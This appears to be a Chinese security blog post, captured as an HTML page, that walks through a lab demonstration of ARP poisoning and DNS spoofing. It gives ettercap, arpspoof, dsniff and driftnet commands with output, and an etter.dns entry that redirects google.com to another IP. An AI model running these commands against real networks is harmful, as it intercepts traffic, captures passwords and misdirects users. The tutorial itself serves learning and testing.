@@ -1,0 +1,1345 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="arpspoof,dnsspoof," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="概述操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。">
+<meta name="keywords" content="arpspoof,dnsspoof">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中间人攻击——ARP毒化与DNS毒化">
+<meta property="og:url" content="http://orleven.orleven.com/2018/02/28/arpspoof-dnsspoof/index.html">
+<meta property="og:site_name" content="Orleven Blog">
+<meta property="og:description" content="概述操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://orleven.orleven.com/images/arpspoof/arpspoof-1.jpg">
+<meta property="og:image" content="http://orleven.orleven.com/images/arpspoof/arpspoof-2.jpg">
+<meta property="og:image" content="http://orleven.orleven.com/images/arpspoof/arpspoof-3.jpg">
+<meta property="og:image" content="http://orleven.orleven.com/images/arpspoof/arpspoof-4.png">
+<meta property="og:updated_time" content="2018-03-11T05:59:12.178Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="中间人攻击——ARP毒化与DNS毒化">
+<meta name="twitter:description" content="概述操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。">
+<meta name="twitter:image" content="http://orleven.orleven.com/images/arpspoof/arpspoof-1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://orleven.orleven.com/2018/02/28/arpspoof-dnsspoof/"/>
+
+
+
+
+
+  <title>中间人攻击——ARP毒化与DNS毒化 | Orleven Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?00a49c2d4ae104181c342efc37bbbdc8";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Orleven Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Orleven Blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://orleven.orleven.com/2018/02/28/arpspoof-dnsspoof/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Orleven">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Orleven Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">中间人攻击——ARP毒化与DNS毒化</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-28T20:52:12+08:00">
+                2018-02-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/spoof/" itemprop="url" rel="index">
+                    <span itemprop="name">spoof</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/02/28/arpspoof-dnsspoof/" class="leancloud_visitors" data-flag-title="中间人攻击——ARP毒化与DNS毒化">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。</p>
+<a id="more"></a>
+<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>测试机子如下 ： </p>
+<p>攻击者：192.168.111.183<br>被欺骗主机：192.168.111.173<br>默认网关（_gateway）：192.168.111.2</p>
+<h1 id="ARP毒化"><a href="#ARP毒化" class="headerlink" title="ARP毒化"></a>ARP毒化</h1><p>查看arp表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# arp</div><div class="line">Address                  HWtype  HWaddress           Flags Mask            Iface</div><div class="line">192.168.111.254          ether   00:50:56:fe:53:af   C                     eth0</div><div class="line">_gateway                 ether   00:50:56:e6:26:42   C                     eth0</div></pre></td></tr></table></figure>
+<p>开启转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:~# cat /proc/sys/net/ipv4/ip_forward</div><div class="line">0</div><div class="line">root@kali:~# echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</div><div class="line">root@kali:~# cat /proc/sys/net/ipv4/ip_forward</div><div class="line">1</div></pre></td></tr></table></figure>
+<h2 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h2><p>Ettercap是一个多用途的开源工具，可以用来执行嗅探、密码抓取、主机分析等，并且还可以图形化启动。</p>
+<p>另外ettercap有些不错的插件，可以增强中间人攻击。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dns_spoof (执行DNS欺骗攻击)</div><div class="line">Dos_attack(对受害主机进行拒绝服务攻击)</div><div class="line">Chk_poison(检测是否成功进行了攻击)</div><div class="line">Repoison_arp(顾名思义，修复ARP)</div><div class="line">......</div></pre></td></tr></table></figure>
+<p>具体操作如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# ettercap -G    // 图形化启动ettercap</div><div class="line">root@kali:~# ettercap -T -q -M ARP  // 对所有主机进行ARP欺骗</div><div class="line">root@kali:~# ettercap -T -q -M ARP -A 192.168.111.173  // 对192.168.111.173进行欺骗</div></pre></td></tr></table></figure>
+<p>查看受害者主机的arp表会发现，网关的mac地址被替换成了攻击机的mac地址。</p>
+<h2 id="Dsniff"><a href="#Dsniff" class="headerlink" title="Dsniff"></a>Dsniff</h2><p>Dsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Msgsnarf</div><div class="line">Urlsnarf</div><div class="line">Mailsnarf</div><div class="line">Filesnarf</div><div class="line">dnsspoof</div></pre></td></tr></table></figure>
+<h3 id="arpspoof重定向受害者的流量传送给攻击者。"><a href="#arpspoof重定向受害者的流量传送给攻击者。" class="headerlink" title="arpspoof重定向受害者的流量传送给攻击者。"></a>arpspoof重定向受害者的流量传送给攻击者。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.2</div><div class="line">0:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9</div><div class="line">0:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9</div><div class="line">......</div></pre></td></tr></table></figure>
+<h3 id="arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）"><a href="#arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）" class="headerlink" title="arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）"></a>arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# arpspoof -i eth0 -t 192.168.111.2 192.168.111.183</div><div class="line">0:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b9</div><div class="line">0:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b9</div><div class="line">......</div></pre></td></tr></table></figure>
+<h3 id="截获敏感信息"><a href="#截获敏感信息" class="headerlink" title="截获敏感信息"></a>截获敏感信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# driftnet -i eth0 // 截获图片</div><div class="line">root@kali:~# dsniff  -i eth0 // 截获密码</div></pre></td></tr></table></figure>
+<h1 id="DNS毒化"><a href="#DNS毒化" class="headerlink" title="DNS毒化"></a>DNS毒化</h1><p>DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。<br>使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问baidu.com，并且谷歌的IP地址为220.181.57.216，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。</p>
+<h2 id="Ettercap-1"><a href="#Ettercap-1" class="headerlink" title="Ettercap"></a>Ettercap</h2><p>ettercap包含一个DNS插件，可以进行DNS欺骗攻击。</p>
+<ol>
+<li><p>在服务器上开启web服务。</p>
+</li>
+<li><p>查找编辑etter.dns文件，并在里面添加需要进行欺骗网站域名：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# find / -name etter.dns</div><div class="line">/etc/ettercap/etter.dns</div><div class="line">root@kali:~# vim /etc/ettercap/etter.dns</div></pre></td></tr></table></figure>
+<p>比如将google.com的ip导向118.24.150.108</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">google.com A  118.24.150.108 </div><div class="line">*.google.com A 118.24.150.108 </div><div class="line">www.google.com PTR 118.24.150.108</div></pre></td></tr></table></figure>
+<ol>
+<li>然后启动</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# ettercap -G</div></pre></td></tr></table></figure>
+<p><img src="/images/arpspoof/arpspoof-1.jpg" alt="arpspoof-1"></p>
+<ol>
+<li>点击上方菜单的Sniff，选择<code>Unified sniffing</code>，并选择网卡。</li>
+</ol>
+<p><img src="/images/arpspoof/arpspoof-2.jpg" alt="arpspoof-2"></p>
+<ol>
+<li><p>点击上方菜单的Hosts，选择<code>Scan for hosts</code>，进行主机扫描。</p>
+</li>
+<li><p>点击上方菜单的Hosts，选择<code>Hosts list</code>，进行选择目标主机为target1，选择网关为target2。</p>
+</li>
+<li><p>点击上方菜单的Mitm，选择<code>ARP Poisoning</code>，然后勾选<code>Sniff remote connections</code>。</p>
+</li>
+<li><p>点击上方菜单的Plugins，选择<code>Manage the plugins</code>，然后勾选<code>dns_spoof</code>以及<code>remote browser</code>,当然还有其他插件，根据需求选择。</p>
+</li>
+</ol>
+<p><img src="/images/arpspoof/arpspoof-3.jpg" alt="arpspoof-3"></p>
+<ol>
+<li>目标主机访问此域名<code>google</code>。</li>
+</ol>
+<p><img src="/images/arpspoof/arpspoof-4.png" alt="arpspoof-4"></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://www.freebuf.com/articles/system/11846.html" target="_blank" rel="noopener">中间人攻击-ARP毒化</a><br><a href="http://www.freebuf.com/articles/system/5265.html" target="_blank" rel="noopener">中间人攻击-DNS毒化</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/arpspoof/" rel="tag"># arpspoof</a>
+          
+            <a href="/tags/dnsspoof/" rel="tag"># dnsspoof</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/08/port-pentest/" rel="next" title="端口渗透总结">
+                <i class="fa fa-chevron-left"></i> 端口渗透总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/09/spoof-llmnr-wpad/" rel="prev" title="中间人攻击——LLMNR、WPAD以及Responder">
+                中间人攻击——LLMNR、WPAD以及Responder <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+      
+        
+          <ul class="sidebar-nav motion-element">
+            <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+              文章目录
+            </li>
+            <li class="sidebar-nav-overview" data-target="site-overview">
+              站点概览
+            </li>
+          </ul>
+        
+      
+
+
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Orleven" />
+          <p class="site-author-name" itemprop="name">Orleven</p>
+           
+              <p class="site-description motion-element" itemprop="description">Life is full of ups and downs.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/ || archive">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">63</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-link"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.warmeng.com/" title="warmeng" target="_blank">warmeng</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.0kami.cn/" title="0kimi" target="_blank">0kimi</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+      
+        
+        <!--noindex-->
+          <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+            <div class="post-toc">
+
+              
+                
+              
+
+              
+                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#准备"><span class="nav-number">2.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ARP毒化"><span class="nav-number">3.</span> <span class="nav-text">ARP毒化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ettercap"><span class="nav-number">3.1.</span> <span class="nav-text">Ettercap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dsniff"><span class="nav-number">3.2.</span> <span class="nav-text">Dsniff</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arpspoof重定向受害者的流量传送给攻击者。"><span class="nav-number">3.2.1.</span> <span class="nav-text">arpspoof重定向受害者的流量传送给攻击者。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）"><span class="nav-number">3.2.2.</span> <span class="nav-text">arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#截获敏感信息"><span class="nav-number">3.2.3.</span> <span class="nav-text">截获敏感信息</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS毒化"><span class="nav-number">4.</span> <span class="nav-text">DNS毒化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ettercap-1"><span class="nav-number">4.1.</span> <span class="nav-text">Ettercap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+              
+
+            </div>
+          </section>
+        <!--/noindex-->
+        
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Orleven</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="http://www.orleven.com">orleven</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+  <div class="theme-info">  <a class="theme-link" target="_blank" href="https://blog.orleven.com">My blog</a> version 1.2 </div>
+
+
+
+  
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
